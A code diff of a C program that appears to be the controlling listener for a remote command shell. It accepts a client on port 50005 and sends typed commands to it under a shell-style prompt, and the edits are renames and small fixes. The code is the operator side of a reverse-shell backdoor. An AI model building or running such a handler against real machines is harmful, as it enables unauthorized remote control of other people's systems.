@@ -2,14 +2,13 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <winsock2.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
 #define bzeroWin(p, size) (void) memset((p), 0, (size))
-#define CONN_AMNT = 5
+#define CONN_AMNT 5
 
 int main() {
     int sock, clientSocket;
@@ -28,13 +27,13 @@ int main() {
 		return 1;
 	}
 
-    servIP = "192.168.1.6";
+    servIP = "192.168.43.31";
     servPort = 50005;
-    server_address.sin_family = AF_INET;
-	server_address.sin_addr.s_addr = inet_addr(servIP);
-	server_address.sin_port = htons(servPort);
+    serverAddress.sin_family = AF_INET;
+	serverAddress.sin_addr.s_addr = inet_addr(servIP);
+	serverAddress.sin_port = htons(servPort);
 
-    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
+    bind(sock, (struct sockaddr *) &serverAddress, sizeof(serverAddress));
 	listen(sock, CONN_AMNT);
     clientLength = sizeof(clientAddress);
 	clientSocket = accept(sock, (struct sockaddr *) &clientAddress, &clientLength);
@@ -45,7 +44,7 @@ int main() {
         // adaption for windows mchine
         // bzeroWin(&buffer, sizeof(buffer));
 		// bzeroWin(&response, sizeof(response));
-		printf("[Shell]#%s~$: ", inet_ntoa(client_address.sin_addr));
+		printf("[%s]-[cmd]~$: ", inet_ntoa(clientAddress.sin_addr));
 		fgets(buffer, sizeof(buffer), stdin);
         strtok(buffer, "\n");
 		write(clientSocket, buffer, sizeof(buffer));
